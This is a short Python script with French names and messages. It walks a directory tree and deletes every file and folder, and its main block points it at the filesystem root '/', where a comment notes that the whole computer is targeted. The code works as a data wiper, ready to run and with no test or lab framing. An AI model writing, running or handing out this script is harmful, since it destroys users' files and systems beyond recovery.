import os
import shutil

def supprimer_contenu(dossier):
    for racine, dossiers, fichiers in os.walk(dossier, topdown=False):
        for fichier in fichiers:
            chemin_fichier = os.path.join(racine, fichier)
            try:
                os.remove(chemin_fichier)
                print(f"Fichier supprimé: {chemin_fichier}")
            except Exception as e:
                print(f"Erreur lors de la suppression du fichier {chemin_fichier}: {e}")
        for dossier in dossiers:
            chemin_dossier = os.path.join(racine, dossier)
            try:
                shutil.rmtree(chemin_dossier)
                print(f"Dossier supprimé: {chemin_dossier}")
            except Exception as e:
                print(f"Erreur lors de la suppression du dossier {chemin_dossier}: {e}")

if __name__ == "__main__":
    dossier_a_supprimer = "/"  # Attention: cela cible la racine de l'ordinateur
    supprimer_contenu(dossier_a_supprimer)
